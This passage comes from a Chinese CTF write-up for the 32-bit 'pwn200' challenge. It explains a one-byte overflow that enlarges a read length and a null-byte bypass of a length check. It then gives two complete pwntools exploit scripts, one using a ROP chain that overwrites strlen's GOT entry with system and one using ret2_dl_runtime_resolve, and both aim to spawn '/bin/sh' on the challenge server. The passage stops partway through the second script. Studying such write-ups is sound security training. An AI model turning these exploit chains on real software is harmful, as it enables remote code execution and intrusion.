class="built_in">memset</span>(&amp;slogan, <span class="number">0</span>, <span class="number">128u</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input name:"</span>, <span class="number">12u</span>);</span><br><span class="line">    <span class="comment">// name的大小为16byte,多读一个字节,覆盖了后面的数据</span></span><br><span class="line">    read(<span class="number">0</span>, name, nbytes + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 检查输入长度,name输入长度最长为10byte,并且name前8个字节为"syclover"</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(name) - <span class="number">1</span> &gt; <span class="number">9</span> || <span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, name, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input slogan:"</span>, <span class="number">14u</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;slogan, nbytes);</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, &amp;slogan, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们通过分析，可以知道，程序需要<strong><code>两次输入</code></strong>，<strong><code>第一次</code></strong>输入“name”，<strong><code>第二次</code></strong>输入“slogan”。<code>name</code>的大小为<code>16byte</code>，但是程序在读取输入的时候，最多可以读取<code>17byte</code>，多了一个字节，这会<code>覆盖后面的nbytes</code>。如果覆盖为<code>0xFF</code>，则会在后面从标准输入<code>读取“slogan”</code>的时候，<code>读取的最大长度</code>变为<code>255byte</code>，而“slogan”的<code>实际大小</code>只有<code>128byte</code>，这就会导致覆盖栈上的函数的<code>EBP</code>和<code>返回地址</code>。如果输入的数据是经过<code>精心构造</code>过的，就可以<code>劫持程序的控制流</code>。</p><p>&emsp;&emsp;在<code>“name”</code>输入完后，程序会对输入的<code>长度</code>和<code>内容</code>进行判断。长度最长为<code>10byte</code>，并且<code>前8个字节</code>为<code>“syclover”</code>。我们可以使用<code>“\x00”截断</code>，对长度判断进行绕过。</p><h4 id="3、方法一：使用题目提供的libc库，进行利用"><a href="#3、方法一：使用题目提供的libc库，进行利用" class="headerlink" title="3、方法一：使用题目提供的libc库，进行利用"></a>3、方法一：使用题目提供的libc库，进行利用</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、程序从<code>标准输入</code>读取<code>“name”</code>的时候，利用<code>“\x00”</code>绕过<code>strlen()</code>的长度验证，输入构造的<code>17bytes</code>数据，将<code>nbytes</code>修改为<code>“0xFF”</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"syclover\x00\xff\xff\xff\xff\xff\xff\xff\xff"</span></span><br></pre></td></tr></table></figure><ul><li>2、程序从<code>标准输入</code>读取<code>“slogan”</code>的时候，输入精心构造的<code>一段ROP的shellcode</code>，劫持程序的控制流。首先利用<code>write函数</code>泄露出<code>read函数的地址</code>，然后根据<code>libc</code>中<code>read函数</code>和<code>system函数</code>的相对偏移，计算出<code>system函数的真实地址</code>。再通过<code>read函数</code>修改<code>strlen的GOT表</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(write_plt) + p32(ppp_ret) + p32(<span class="number">0x01</span>) + p32(read_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0x00</span>) + p32(strlen_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">shellcode += p32(main_addr)</span><br><span class="line">ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0x04</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure><ul><li>3、程序再次从<code>标准输入</code>读取<code>“name”</code>的时候，传入字符串<code>“/bin/sh”</code>。当执行到<code>strlen函数</code>的时候，实际上执行的是<code>system函数</code>，参数即为<code>“/bin/sh”</code>。</li></ul><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary =<span class="string">'./pwn200'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'218.2.197.235'</span>,<span class="number">10101</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./pwn200','''</span></span><br><span class="line">        <span class="comment">#                             bp 0x080484AC</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048507</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048524</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048579</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048596</span></span><br><span class="line">        <span class="comment">#                             bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment">#                 bp 0x080484AC</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048507</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048524</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048579</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048596</span></span><br><span class="line">    <span class="comment">#                 bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw_input('[1] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[2] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="comment"># raw_input('[3] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line"></span><br><span class="line">    ppp_ret = <span class="number">0x08048646</span></span><br><span class="line">    write_plt = <span class="number">0x080483A0</span></span><br><span class="line">    read_plt = <span class="number">0x08048360</span></span><br><span class="line">    read_got = <span class="number">0x08049850</span></span><br><span class="line">    strlen_got = <span class="number">0x08049858</span></span><br><span class="line">    main_addr = <span class="number">0x080484AC</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(write_plt) + p32(ppp_ret) + p32(<span class="number">0x01</span>) + p32(read_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0x00</span>) + p32(strlen_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">    shellcode += p32(main_addr)</span><br><span class="line">    ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0x04</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[4] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw_input('[5] before receive write_data')</span></span><br><span class="line">    write_data = io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> write_data]</span><br><span class="line">    <span class="comment"># raw_input('[6] before receive read_addr_data')</span></span><br><span class="line">    read_addr_data = io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> read_addr_data]</span><br><span class="line">    read_addr = u32(read_addr_data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read_addr:"</span>,hex(read_addr)</span><br><span class="line">    <span class="comment">#libc_info = ELF("./libc.so",checksec = False)</span></span><br><span class="line">    libc_info = ELF(<span class="string">"./libc-2.23.so"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">    system_offset = libc_info.symbols[<span class="string">"system"</span>]</span><br><span class="line">    read_offset = libc_info.symbols[<span class="string">"read"</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_offset:"</span>,hex(system_offset)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read_offset:"</span>,hex(read_offset)</span><br><span class="line"></span><br><span class="line">    libc_addr = read_addr - read_offset</span><br><span class="line">    system_addr = libc_addr + system_offset</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span> + hex(system_addr)</span><br><span class="line">    <span class="comment"># raw_input('[7] before send system_addr')</span></span><br><span class="line">    io.send(p32(system_addr))</span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[8] before send "/bin/sh"')</span></span><br><span class="line">    io.send(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    io.interactive(prompt = pwnlib.term.text.bold_red(<span class="string">'$'</span>) + <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h4 id="4、方法二：如果题目未提供libc库，使用ret2-dl-runtime-resolve方式进行利用"><a href="#4、方法二：如果题目未提供libc库，使用ret2-dl-runtime-resolve方式进行利用" class="headerlink" title="4、方法二：如果题目未提供libc库，使用ret2_dl_runtime_resolve方式进行利用"></a>4、方法二：如果题目未提供libc库，使用ret2_dl_runtime_resolve方式进行利用</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、程序从<code>标准输入</code>读取<strong><code>“name”</code></strong>的时候，利用<code>“\x00”</code>绕过<code>strlen()</code>的长度验证，输入构造的<code>17bytes</code>数据，将<code>nbytes</code>修改为<code>“0xFF”</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"syclover\x00\xff\xff\xff\xff\xff\xff\xff\xff"</span></span><br></pre></td></tr></table></figure><ul><li>2、程序从<code>标准输入</code>读取<strong><code>“slogan”</code></strong>的时候，输入精心构造的<code>一段ROP的shellcode</code>，劫持程序的<code>控制流</code>。我们使用<code>read函数</code>将伪造的<strong><code>system函数</code></strong>的<strong><code>重定位表项数据</code></strong>、<strong><code>符号表项数据</code></strong>、<strong><code>字符串表项数据</code></strong>以及<strong><code>参数“/bin/sh”</code></strong>写入到内存中的<code>可写区域</code>，这里选择<code>bss节</code>之后的区域。 然后，返回到<code>main函数</code>，进行<code>下一次payload</code>的传递，用于解析<code>system函数</code>地址，并<code>调用system函数</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(reloc_data_addr) + p32(len(reloc_data))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(sym_data_addr) + p32(len(sym_data))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(func_name_addr) + p32(len(func_name))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(binsh_str_addr) + p32(len(binsh_str))</span><br><span class="line">shellcode += p32(main_addr)</span><br><span class="line">ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure><ul><li>3、程序从<code>标准输入</code>读取<strong><code>“name”</code></strong>的时候，同<code>第一步</code>一样。程序从<code>标准输入</code>读取<strong><code>“slogan”</code></strong>的时候，输入<code>另一段</code>精心构造的<code>一段ROP的shellcode</code>，劫持程序的<code>控制流</code>。首先调用<code>PLT0</code>处的代码，传入伪造的<code>system函数重定位表项</code>相对于<code>重定位表起始</code>的偏移量<code>reloc_index</code>，利用<strong><code>_dl_runtime_resolve()函数</code></strong>进行<code>system函数地址</code>的解析。<code>_dl_runtime_resolve()</code>函数解析完<code>system函数</code>的地址后，就会<code>调用system函数</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(PLT0) + p32(reloc_index) + p32(main_addr) + p32(binsh_str_addr)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./pwn200'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x080482F8</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x080481E0</span></span><br><span class="line">DT_STRTAB = <span class="number">0x08048260</span></span><br><span class="line">DT_VERSYM = <span class="number">0x080482C0</span></span><br><span class="line">PLT0 = <span class="number">0x08048350</span></span><br><span class="line">BSS_Addr = <span class="number">0x08049870</span></span><br><span class="line"></span><br><span class="line">system_got = <span class="number">0x080499A0</span></span><br><span class="line">ppp_ret = <span class="number">0x08048646</span></span><br><span class="line">send_plt = <span class="number">0x080483A0</span></span><br><span class="line">read_plt = <span class="number">0x08048360</span></span><br><span class="line">read_got = <span class="number">0x08049850</span></span><br><span class="line">strlen_got = <span class="number">0x08049858</span></span><br><span class="line">main_addr = <span class="number">0x080484AC</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word r_info;   /* 重定位类型和符号表下标 */ 4byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Rel;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_reloc_data</span><span class="params">(sym_index,got_plt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(got_plt) + p32(<span class="number">0x07</span> + (sym_index&lt;&lt;<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word    st_size;  /* 符号的大小 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf32_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># BSS_Addr(0x08049870) = DT_JMPREL(0x080482F8) + reloc_offset(0x1578)</span></span><br><span class="line">reloc_offset = <span class="number">0x1578</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x080499C0) = DT_SYMTAB(0x080481E0) + sym_index(0x17e) * 16   (not useful)</span></span><br><span class="line">reloc_data_addr = BSS_Addr</span><br><span class="line">reloc_data = generate_x86_reloc_data(<span class="number">0x17e</span>,system_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x080499E0) = DT_STRTAB(0x08048260) + name_offset(0x1780)</span></span><br><span class="line">sym_data_addr = <span class="number">0x080499C0</span></span><br><span class="line">sym_data = generate_x86_sym_data(<span class="number">0x1780</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x080499E0) = sym_data_addr + 0x20</span></span><br><span class="line">func_name_addr = sym_data_addr + <span class="number">0x20</span></span><br><span class="line">func_name = <span class="string">"system\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x080499F0) = func_name_addr + 0x10</span></span><br><span class="line">binsh_str_addr = func_name_addr + <span class="number">0x10</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'218.2.197.235'</span>,<span class="number">10101</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./pwn200','''</span></span><br><span class="line">        <span class="comment">#                             bp 0x080484AC</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048507</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048524</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048579</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048596</span></span><br><span class="line">        <span class="comment">#                             bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment">#                 bp 0x080484AC</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048507</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048524</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048579</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048596</span></span><br><span class="line">    <span class="comment">#                 bp 0x080485b8''')</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------Stage1: Fake system's reloc_data,sym_data and str_data.----------------"</span></span><br><span class="line">    <span class="comment"># raw_input('[1] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[2] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[3] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(reloc_data_addr) + p32(len(reloc_data))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(sym_data_addr) + p32(len(sym_data))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(func_name_addr) + p32(len(func_name))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(binsh_str_addr) + p32(len(binsh_str))</span><br><span class="line">    shellcode += p32(main_addr)</span><br><span class="line">    ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[4] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment"># raw_input('[5] before send reloc_data')</span></span><br><span class="line">    io.send(reloc_data)</span><br><span class="line">    <span class="comment"># raw_input('[6] before send sym_data')</span></span><br><span class="line">    io.send(sym_data)</span><br><span class="line">    <span class="comment"># raw_input('[7] before send func_name')</span></span><br><span class="line">    io.send(func_name)</span><br><span class="line">    <span class="comment"># raw_input('[8] before send binsh_str')</span></span><br><span class="line">    io.send(binsh_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------Stage2: Call system(\"/bin/sh\")----------------"</span></span><br><span class="line">    <span class="comment"># raw_input('[9] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[10] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span 